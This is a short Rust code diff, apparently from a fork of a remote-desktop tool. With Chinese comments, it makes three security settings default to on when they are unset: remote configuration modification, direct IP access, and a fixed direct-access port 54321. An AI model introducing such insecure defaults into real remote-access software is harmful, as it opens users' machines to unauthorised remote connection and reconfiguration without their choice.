@@ -470,6 +470,21 @@ impl Config2 {
             decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
         config.unlock_pin = unlock_pin;
         store |= store2;
+        // 将设置里的 安全-允许远程修改配置 默认打勾
+        if !config.options.contains_key("allow-remote-config-modification") {
+            config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
+            store = true;
+        }
+        // 将设置里的 安全-允许 IP 直接访问 默认打勾
+        if !config.options.contains_key("direct-server") {
+            config.options.insert("direct-server".to_string(), "Y".to_string());
+            store = true;
+        }
+        // 将设置里的 安全-允许 IP 直接访问 默认端口号
+        if !config.options.contains_key("direct-access-port") {
+            config.options.insert("direct-access-port".to_string(), "54321".to_string());
+            store = true;
+        }
         if store {
             config.store();
         }
